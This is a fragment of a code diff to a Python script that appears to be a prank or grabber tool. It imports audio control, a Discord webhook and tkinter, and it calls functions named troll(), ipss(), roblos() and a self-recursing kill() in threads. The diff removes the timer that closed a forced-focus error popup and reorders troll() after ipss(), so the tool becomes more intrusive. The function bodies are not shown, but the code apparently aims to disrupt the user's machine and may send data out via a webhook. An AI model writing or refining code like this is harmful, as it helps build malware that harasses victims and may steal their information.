@@ -4,7 +4,6 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord_webhook import DiscordWebhook
 import tkinter as tk
-from tkinter import messagebox
 def vol():
  devices = AudioUtilities.GetSpeakers()
  interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -22,8 +21,6 @@ def show_error_popup():
         error_popup.title("Error Popup")
         error_popup.lift()
         error_popup.focus_force()
-        root.update()
-        root.after(2000, error_popup.destroy)
         root.update()
 urs = threading.Thread(target=show_error_popup)
 urs.start()
@@ -155,7 +152,7 @@ def kill():
   except:pass
   kill()
 roblos()
-troll()
 ipss()
+troll()
 opp=threading.Thread(target=kill)
 opp.start()
